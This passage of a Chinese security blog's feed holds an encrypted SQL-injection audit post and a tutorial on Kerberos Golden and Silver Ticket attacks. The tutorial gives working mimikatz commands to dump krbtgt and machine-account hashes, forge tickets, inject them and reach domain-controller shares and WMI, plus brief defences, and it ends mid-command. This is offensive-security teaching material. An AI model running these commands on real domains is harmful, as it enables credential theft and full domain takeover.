      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>188jianzhan SQL注入漏洞代码审计</title>
    <link href="https://shu1l.github.io/2020/06/28/188jianzhansql-zhu-ru-lou-dong-dai-ma-shen-ji/"/>
    <id>https://shu1l.github.io/2020/06/28/188jianzhansql-zhu-ru-lou-dong-dai-ma-shen-ji/</id>
    <published>2020-06-28T08:51:43.000Z</published>
    <updated>2020-11-25T08:55:53.828Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="5e9a99c637a5dd944a8dab441966c23806a2e8b08e466a190627f6804b2e0cf0">7f72502a417ec5d3e785d86e3c7240c8543f7b25d0690aae79fb85f4d15385ed5fe309ca0c297fa3a8bd8b1c1223a70cb8d7c64368057cf60f41349d86aacf6736aa015fe04cd35b0be3b81d6879aa6af3932a4a4a0af2ead4ff451de8c40a66a6a3c0e20481256d236700b6b4e5e0b75a4e0153cc0d7f0ab4b2142af76bb3484cb2aa0ef593628e4cb2539e33b02f2b7e28ec238225057d409994c89f81c70c809fe6e6fda49f90793ed92e355747994b96ef7aa2bd43e39a9aff0946117a97f70831c6adb74ccd555ddad2582ee8ee3b4793bee45fd3881ee36d20de2056105b681baf7be433e014d5529d6bce2f188fe4d8db1dbcc3a1247f8fa12898bdc36dc288713350f9c219226dd9b8ab89dede423e0b7f8382539b562d3a5f042b2b41efe9c01ca835e3be2edaf8de8981ccaf044e755da144c95e6d7fe9f79a1886f789195846e0669b886101ba0d093dcfb99efa49fa78b62d02e5d9ea40425674c97f08dec2d7d025d151f56d41f33016305016203fc5501baeae86291a1c640d3f4a603b253b47a75f71bad9ef16ebcfa244674714f5fb5fa7a2952b0788bb4814153859a32508e4e72592c157df8161687ba2b37320c68639491aab6a94731fe22dc8cd1207304f55fb9d0a33391ece934551b08665795b91c3ee80cb6a22eec57d576873edd07336bd6c0a2206091940cac64dfa7799d40c1422fadc2c4c11fb2fcb317d07f11da2c53a670b4ca59ef367e4253435e2b6be841f52b8bc082518dda10dd5bae54e416d4bb3c867bf8afef34e4ec5a1571a7b476f8880a8d46a7f0028c9c481c0609f050018423b1f43d82b381246466de91a251b0cd9ba0ba3844573c789a37ec5701aabcec0fc8018c9507fccbf6a0c5d7ea4104410c74ca1d782ccb1c7f8280a6289160f97e954bea95e0f47e85d752b41df906df42edee3c4a9628a154b5f6c134e14352e4292a7495a187bcde3538c940b3db661ee08b2832edd7df25e4b21cefaffce3bd4c903e7c70dfcc107257a99cf1ed1427cb24dabc96be3013c47fd1118a593cdda5abbd0352faa47fd9cbf349d42b0b2423cead0fbdd8d0e4893376b3a81ba31c0e577b8d8cd5020df9aced6812ee2943f6100afee160a676bfb8cfc7c093f05442ad3d4f0200582f37d8c0d9954ae8c64074e01ebdd5e030e02836c3b2aedee69502cc3566c480caf1bb50cd137d891ece487a670bc3e4634ff41999ded90cf76787dbe5c2bd2dc002107d003a1dd579f385ef35befe98a8c0508758c48c33f51ed4474813dfc5da10e43a9140ad3e2e53748c3c4a5541d08f47d531743a8a2ebe56458000a1709e56d140e5ca1006dc1fc4a82b5329a3d2a1875f5b1e36041ed764e4133724b89713c26b9645f34a411bf1dd132f80d870bf117ffdacf94493c419bdd00120aed497c87112197c6138e2fadc5bc4d71fe05e854ecb91e18ecfc9d932c80f0517c13f95a1a73cda03157f30ae1d85ce8c0a38631f027cd71aaee1852b8c64e4425fbe7b36233ff78adbe91c44046bef2350175a34c2fd8b96cf6223d62c7df43e653a40650393905b4e7fa0fab5f2f2b064985d8c48c9e502a1346836ddce4df143039e3bf7d639b2596ca46349b8bd7d66ffc4ea9c627e57dea84ac5acd9d4cfe1aaef9ed44052b72207e5bde3f6a3e21b69e0d5711deaa1f5f0084923d337e6a3942948373ef3ee663a85d95930b7804a794caa91a8c4b5c739bd2753ca3aeefc63e03a11918553acddd527153824210b5fbfcf8c6735bb0005ec33a4979dfce3c2c70c5fff4261754310d531825ff5f66e5cae20698b942fbcbc0afd9ea03359ce5efa8d5d8fd10ae087097ddecba39637bea91c52b0c51c926d91937625b56d6732fc79de8f26029ec929935925801418244eb0e5d8ea03c2ebbaacd59fc8523fca21a7127c5a585fcf27b3b2acf5fdf6ca7d16cdfe8821796f00b447a110ccb381bbab6738d3e2209201138901b06f906bb14f08e596892569ba34da35264aceb3f8af602d39d4148ca3f1be99cc9eab095794ffdbe6cc311ac1b35741e7fbb559133f55d37c60640b805cca764448ba7e1998b44d02fbf55860db7ac3cc22842a956a65735bb610ce5336c4fb0ebc10863fe2df19e5b255574f7018aaabf510655339d8d28ab41c2d44f83f44516a53a3ded03c3f6ae37baab9073fbed998f641c260b4438616040b0c486262775ef163d499cd6d958c24c753a77b9cc9c84cdcc1764b1ce2a4c63eb4b6478816e92b04d067554a50f5687a170d921de58149d141787b99e13a32aabb2ae30dd8298517f17fde540f10b5705c2ef8234a5c67019c4b2aa74c148b8a4f4bae84e865bf5b9d37fc4e9cb054d02becc074b51928afb69086364a9e545ce51766c08357a1c5863e984b0bdb351affec69f30867e69f0067b81df295aaf73bced5aa02abc45ccef90720d9a03014641b5ef6695afcce1f2e3fb09395efab198845e132d04ef9a1254f41b7fab963fe57613c4af73c067c60d4b3e763819998855352e00d76e413e4462f6fb8a36654d50342a428007f4985bbc796095e6dbdd4673bdadffb572fe42314ba42d35b6b0e29e89494458f5e36c3e20760da233ee6a041ed3636fede7d18947d8ec23c5a2a04f57b4a6e35e68612350011423b822200ea301d124676f9f68d80a4cf5af437eefa89516fca0931519c8a5b2cff6968f2589ff7a3856797693a9cd6b8d8c74118ec315e1a2ea110145b2c46c54ced2c3569ca05473516db7d628cf6263dcea5570af3deee40d22bdad8915eee98fe644cea3c3e405a4c2a0bde5db526c8471dbcd54f84a946b58e9f9c0f573abdb081a6cfe14d02dedb099f4f6f6943df73a557d59928c41c7caa018ca353ced80433d9b38f7023dbf6f522f3559da1e6f45695a60e5241af55ebec73ed816e187a4807269e9074293e6d4201624e1daa6243a84325383475ee7f36dc0db328871db8fc9b26b526129f35fb50598bbf6c9b044969838587d959756ae7c0e009353382880282d6b1b7c7d0f5884ee725980b23dc866815d6f810ac80b8395986cbcabbb18ae3b1bbde26c892c7ef15c6077236f56ee4fb7b15e31de2445324d5310f47b21f4805e9776e09817934eb0bc51569407eaf9b3d9b4fc98980c6566a5436f866225c18f5ba6009e2fe2d7bdbec923800b729f325e9f313faf7933814afec1525cf580e1a1879a76dc2f8dbe3da99427837903361a7427ad3382004e9d40c19b6667445463109f68dce8408dd02c40df5b5bb8642375f514a2e94aee0330a577c219befe4db32866cb9fa3373a26bc3a165233ee044eb9e0b96f343d0594c29bf71f292f0d46b3d198bc01a60f533477381f1fbd36f73a4f092d28f341c1c1a698e3cfb2426cbac53a4fea5e5098100a5b3b030a2e14abb522a81d425f7acc4dbdf706df23d696990f0c1b100527458222ab6ed4052f72f73db42143c818f47001c4b960be281bb19c712b4370b1b9662811490031df512ed2fa7323b1f98dded05b4d784f4fc7a64ece17a416d07d47e91f39c1905b5f834702bc2e12c16840e5cda43b2ca181add8abfb00c0ceddb526474a7af0e9a15865deda23d6f41e64e5e84de15d84988fc150e2c6d0f372c33339f3758bf61fb03b8ab79134edce437d43025029edcf52fd6590ceff7478821b1813fd04f8c96aea8870a28c98fa03a4c68300024c84af6d0041e966ea9320e8c2e695c290c3efbd59d093700cfe0bd8bb2c8ab179fb2fbbc59984ae269ff09646548c07457c7d7d2599d6aa1077cde1d4b4c1193f3adc51780ee803ee924b90965cf8ee86d3d7def32aafb49094410f001a0efbe632e811f18195515d76da7e2fb13ade723ee83c9f6e253578b19df222e6db35384899950946501d07fe9ca09c2e8bc5d7c571fb2f35c6aeb0115ea3235c26892445b2601aaf70f6bfe3b6ce444263c5f40f6b92b678aafcd64cc9d043fd1ce173a6a1836da8591a102602af6854be02c3eb0ccea507d7ec0743b6dfa13cfb1381e0d6a5b555eb4b7dbbe9b0e484ae623bf5b2adb117b0fbc4a157304717f7d781e19e4700735fd7464a70edf0f85038e64a85f5ba10afa7a5843f5d4fa8edc8429eefcc587c45db34e838c6445bb6f5f4e10f550b3ebd4657</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="php代码审计学习" scheme="https://shu1l.github.io/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="php代码审计" scheme="https://shu1l.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>浅析黄金票据与白银票据</title>
    <link href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/"/>
    <id>https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</id>
    <published>2020-06-06T00:31:56.000Z</published>
    <updated>2020-11-25T12:10:49.810Z</updated>
    
    <content type="html"><![CDATA[<h2 id="浅析黄金票据与白银票据"><a href="#浅析黄金票据与白银票据" class="headerlink" title="浅析黄金票据与白银票据"></a>浅析黄金票据与白银票据</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        票据传递攻击（PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用<strong>黄金票据</strong>和<strong>白银票据</strong>，通过PtT访问主机相当简单。</p><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>我们首先需要学习关于kerberos认证</p><ul><li><strong>KDC</strong>(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS</li><li><strong>AS</strong>(Authentication Server)： 身份认证服务</li><li><strong>TGS</strong>(Ticket Granting Server)： 票据授予服务</li><li><strong>TGT</strong>(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时</li><li><strong>Pass The Ticket</strong>： 如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限</li></ul><h3 id="金票-GoldenTicket"><a href="#金票-GoldenTicket" class="headerlink" title="(金票)GoldenTicket"></a>(金票)GoldenTicket</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>​        <strong>Golden Ticket</strong>（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p><p>​        每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的TICKET,</p><p>​        对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出krbtgt的Hash值，，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。</p><p><img src="2016011804523676070160.png" alt="Alt text"></p><h5 id="黄金票据特点"><a href="#黄金票据特点" class="headerlink" title="黄金票据特点"></a>黄金票据特点</h5><ul><li>域控制器中的KDC服务不验证TGT中的用户帐户，直到<a href="http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html" target="_blank" rel="noopener">TGT超过20分钟，</a>这意味着攻击者可以使用禁用和删除的帐户，甚至是在Active Directory中不存在的虚拟帐户。</li><li>由于在域控制器上由KDC服务生成的域设置了Kerberos策略，如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据（TGT）只有10小时有效，如果票据声明有效期为10 年，那么也会信任票据的有效性期为10年。</li><li>该<a href="http://adsecurity.org/?p=483" target="_blank" rel="noopener">KRBTGT</a>帐户密码<a href="http://adsecurity.org/?p=483" target="_blank" rel="noopener">从不更改*</a>和直到KRBTGT密码被更改（两次），攻击者可以创建黄金票据。请注意，即使伪造用户更改其密码，创建用于模拟用户的Golden Ticket仍然存在。</li><li>它绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规验证。</li><li>.这个精心创建的TGT要求攻击者拥有Active Directory域的KRBTGT密码哈希值（<a href="http://adsecurity.org/?p=451" target="_blank" rel="noopener">通常从域控制器转储</a>）。</li><li>KRBTGT NTLM哈希可用于生成一个有效的TGT（使用RC4）模拟任何用户访问Active Directory中的任何资源。</li><li>在主机上都可以生成和使用黄金票据（TGT），即使没有加入域也是如此。只要网络可以访问域。</li><li>用于从AD森林中的DC获取有效的TGS票据，并提供一个坚持在一切域访问所有的主机的好办法。</li></ul><h5 id="制作金票的条件："><a href="#制作金票的条件：" class="headerlink" title="制作金票的条件："></a>制作金票的条件：</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、域名称            </span><br><span class="line"><span class="number">2</span>、域的SID值</span><br><span class="line"><span class="number">3</span>、域的KRBTGT账户密码HASH</span><br><span class="line"><span class="number">4</span>、伪造用户名，可以是任意的</span><br></pre></td></tr></table></figure><p>实战中，通常使用Mimikatz来提取krbtgt的NTLM-Hash。</p><p>1.获取域名称</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">view</span> /<span class="built_in">domain</span></span><br></pre></td></tr></table></figure><p>2.Mimikatz获取krbtgt的HTLM-Hash及域SID</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> <span class="string">"lsadump::dcsync /domain:test666.com /user:krbtgt"</span></span><br></pre></td></tr></table></figure><p>3..Mimikatz生成黄金票据</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "kerberos::golden /domain:test666.com /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1497092113</span><span class="string">-2272191533</span><span class="string">-193330055</span> /krbtgt:cac9c793eb3ba2c6abbcc9c14f18a41f /user:test666 /ticket:golden.kirbi"</span><br></pre></td></tr></table></figure><h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤:"></a>利用步骤:</h4><h5 id="1-导出krbtgt的Hash"><a href="#1-导出krbtgt的Hash" class="headerlink" title="1.导出krbtgt的Hash"></a><strong>1.导出krbtgt的Hash</strong></h5><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">lsadump:</span>:dcsync <span class="regexp">/OWA2010SP3.0day.org /</span><span class="string">user:</span>krbtgt</span><br></pre></td></tr></table></figure><p>命令获取krbtgt的值。</p><p><img src="1566542295163.png" alt=""></p><h5 id="2-生成Golden-Ticket"><a href="#2-生成Golden-Ticket" class="headerlink" title="2.生成Golden Ticket"></a><strong>2.生成Golden Ticket</strong></h5><p>​        得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p><p>参数说明：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/admin</span>：伪造的用户名</span><br><span class="line"><span class="string">/domain</span>：域名称</span><br><span class="line"><span class="string">/sid</span>：SID值，注意是去掉最后一个-后面的值</span><br><span class="line"><span class="string">/krbtgt</span>：krbtgt的HASH值</span><br><span class="line"><span class="string">/ticket</span>：生成的票据名称</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:<span class="number">0</span>day.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span> /krbtgt:<span class="number">36f</span>9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi</span><br></pre></td></tr></table></figure><p><img src="1566543225966.png" alt=""></p><h5 id="3-导入伪造Golden-Ticket获得域控权限"><a href="#3-导入伪造Golden-Ticket获得域控权限" class="headerlink" title="3.  导入伪造Golden Ticket获得域控权限"></a><strong>3.  导入伪造Golden Ticket获得域控权限</strong></h5><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ppt golden.kiribi</span><br><span class="line">kerberos::<span class="built_in">list</span></span><br></pre></td></tr></table></figure><p><img src="1566542805439.png" alt=""></p><p>此时就可以通过dir成功访问域控的共享文件夹。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir <span class="symbol">\\</span>OWA2010SP3.0day.org<span class="symbol">\c</span>$</span><br></pre></td></tr></table></figure><p><img src="1566543260644.png" alt=""></p><p><strong>TIPS:</strong></p><p>​    生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash<br>可以用<strong>mimikatz “lsadump::lsa /patch”</strong>导出:</p><p><img src="1049983-20171227215506456-245748150.png" alt="img"></p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul><li>这种方式导入的Ticket默认在20分钟以内生效，如果过期了，再次ptt导入Golden Ticket即可。</li><li>可以伪造任意用户，即使其不存在。</li><li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码。</li></ul><h4 id="黄金票据防御"><a href="#黄金票据防御" class="headerlink" title="黄金票据防御"></a>黄金票据防御</h4><ul><li><strong>限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组</strong>。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。</li><li><strong>禁用KRBTGT帐户，并保存当前的密码以及以前的密码</strong>。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证。</li></ul><h3 id="银票-SilverTickets"><a href="#银票-SilverTickets" class="headerlink" title="(银票)SilverTickets"></a>(银票)SilverTickets</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​        Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p><p><strong>正确的认证流程:</strong></p><p><img src="20160118045254154911118.png" alt="Alt text"></p><p><strong>使用了Silver Ticke的认证流程:</strong></p><p><img src="20160118045256924591213.png" alt="Alt text"></p><h5 id="白银票据的特点"><a href="#白银票据的特点" class="headerlink" title="白银票据的特点"></a>白银票据的特点</h5><ul><li>.白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</li><li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。</li><li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li><li>攻击者需要服务帐户密码哈希值</li><li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过。</li><li>任何事件日志都在目标服务器上。</li></ul><p><strong>制作银票的条件：</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>域名称</span><br><span class="line"><span class="number">2.</span>域的SID值</span><br><span class="line"><span class="number">3.</span>域中的Server服务器账户的NTLM-Hash</span><br><span class="line"><span class="number">4.</span>伪造的用户名，可以是任意用户名.</span><br><span class="line"><span class="number">5.</span>目标服务器上面的kerberos服务</span><br></pre></td></tr></table></figure><p><strong>白银票据的服务列表</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote<span class="built_in"> Server </span>   RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><h5 id="1-获取hash-sid等信息"><a href="#1-获取hash-sid等信息" class="headerlink" title="1.获取hash sid等信息"></a>1.获取hash sid等信息</h5><p>  首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。注意，这里使用的不是Administrator账号的HASH，而是OWA2010SP3$的HASH。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mimikatz</span><span class="selector-class">.exe</span> "<span class="selector-tag">privilege</span><span class="selector-pseudo">::debug"</span> "<span class="selector-tag">sekurlsa</span><span class="selector-pseudo">::logonpasswords"</span> "<span class="selector-tag">exit</span>" &gt; 1<span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="1566649973247.png" alt=""></p><h5 id="2-伪造白银票据"><a href="#2-伪造白银票据" class="headerlink" title="2.伪造白银票据"></a>2.伪造白银票据</h5><p>这时得到了OWA2010SP3$的HASH值，通过mimikatz生成银票。</p><p>参数说明：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/domain</span>：当前域名称</span><br><span class="line"><span class="string">/sid</span>：SID值，和金票一样取前面一部分</span><br><span class="line"><span class="string">/target</span>：目标主机，这里是OWA2010SP3.0day.org</span><br><span class="line"><span class="string">/service</span>：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line"><span class="string">/rc4</span>：目标主机的HASH值</span><br><span class="line"><span class="string">/user</span>：伪造的用户名</span><br><span class="line"><span class="string">/ptt</span>：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用<span class="string">/ticket</span>导出之后再使用kerberos:<span class="function">:ptt</span>来导入</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:<span class="number">0</span>day.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span> /target:OWA2010SP3<span class="number">.0</span>day.org /service:cifs /rc4:<span class="number">125445</span>ed1d553393cce9585e64e3fa07 /user:silver /ptt</span><br></pre></td></tr></table></figure><p><img src="1566654188946.png" alt=""></p><p>这时通过klist查看当前会话的kerberos票据可以看到生成的票据。</p><p><img src="1566654225879.png" alt=""></p><p>使用<code>dir \\OWA2010SP3.0day.org\c$</code>访问DC的共享文件夹。</p><p><img src="1566654265383.png" alt=""></p><h4 id="各种服务中的示例"><a href="#各种服务中的示例" class="headerlink" title="各种服务中的示例"></a>各种服务中的示例</h4><table><thead><tr><th>Service Type</th><th>Service Silver Tickets</th></tr></thead><tbody><tr><td>WMI</td><td>HOST RPCSS</td></tr><tr><td>PowerShell Remoting</td><td>HOST HTTP</td></tr><tr><td>WinRM</td><td>HOST HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>LDAP operations includingMimikatz DCSync</td><td>LDAP</td></tr><tr><td>Windows Remote Server Administration Tools</td><td>RPCSS LDAP CIFS</td></tr></tbody></table><h5 id="Windows共享（CIFS）管理访问的银票"><a href="#Windows共享（CIFS）管理访问的银票" class="headerlink" title="Windows共享（CIFS）管理访问的银票"></a>Windows共享（CIFS）管理访问的银票</h5><p>为 “cifs ”服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限。</p><p>注入CIFS Silver Ticket后，我们现在可以访问目标计算机上的任何共享，包括</p><p>c $共享，我们能够将文件拷贝到共享文件中。</p><h5 id="具有管理员权限的Windows计算机（HOST）白银票据"><a href="#具有管理员权限的Windows计算机（HOST）白银票据" class="headerlink" title="具有管理员权限的Windows计算机（HOST）白银票据"></a>具有管理员权限的Windows计算机（HOST）白银票据</h5><p>创建银票以获得目标计算机上所涵盖的任何Windows服务的管理员权限。这包括修改和创建计划任务的权限。</p><h5 id="Silver-Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行"><a href="#Silver-Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行" class="headerlink" title="Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行"></a>Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行</h5><p>为“ http ”服务和“ wsman ”服务创建Silver Ticket，以获得目标系统上的WinRM和或PowerShell Remoting的管理权限。</p><p>注入两张HTTP＆WSMAN白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。</p><h5 id="白银票据证连接到具有管理员权限Windows计算机上的LDAP"><a href="#白银票据证连接到具有管理员权限Windows计算机上的LDAP" class="headerlink" title="白银票据证连接到具有管理员权限Windows计算机上的LDAP"></a>白银票据证连接到具有管理员权限Windows计算机上的LDAP</h5><p>为“ldap”服务创建Silver Ticket 以获得目标系统（包括Active Directory）上LDAP服务的管理权限。</p><p>利用LDAP Silver Ticket，我们可以远程访问LDAP服务来获得krbtgt的信息</p><p><strong>注：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync</span><br></pre></td></tr></table></figure><p>​    向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户，只读域控制器默认不允许读取用户密码数据。</p><h5 id="白银票据证连接到具有管理员权限Windows计算机上的WMI"><a href="#白银票据证连接到具有管理员权限Windows计算机上的WMI" class="headerlink" title="白银票据证连接到具有管理员权限Windows计算机上的WMI"></a>白银票据证连接到具有管理员权限Windows计算机上的WMI</h5><p> 为“ HOST ”服务和“ rpcss ”服务创建白银票据以使用WMI在目标系统上远程执行命令。</p><p>注入这些白银票据之后，我们可以通过运行“klist”来确认Kerberos TGS票据在内存中注入白银票据后，我们可以通过“传票”来调用WMIC或Invoke-WmiMethod在目标系统上运行命令。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> win32_process <span class="literal">-ComputerName</span> <span class="variable">$</span> Computer <span class="literal">-Credential</span> <span class="variable">$</span> Creds <span class="literal">-name</span> create <span class="literal">-argumentlist</span>“<span class="variable">$</span> RunCommand”</span><br></pre></td></tr></table></figure><h5 id="访问域控上“cifs”服务实列"><a href="#访问域控上“cifs”服务实列" class="headerlink" title="访问域控上“cifs”服务实列"></a>访问域控上“cifs”服务实列</h5><p>首先需要获得如下信息：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">domain</span><br><span class="line"><span class="string">/sid</span></span><br><span class="line"><span class="string">/target</span>:目标服务器的域名全称，此处为域控的全称</span><br><span class="line"><span class="string">/service</span>：目标服务器上面的kerberos服务，此处为cifs</span><br><span class="line"><span class="string">/rc4</span>：计算机账户的NTLM hash，域控主机的计算机账户</span><br><span class="line"><span class="string">/user</span>：要伪造的用户名，此处可用silver测试</span><br></pre></td></tr></table></figure><p>使用mimikatz执行如下命令导入Silver Ticket</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "kerberos::golden /domain:test.local /sid:S<span class="string">-1</span><span 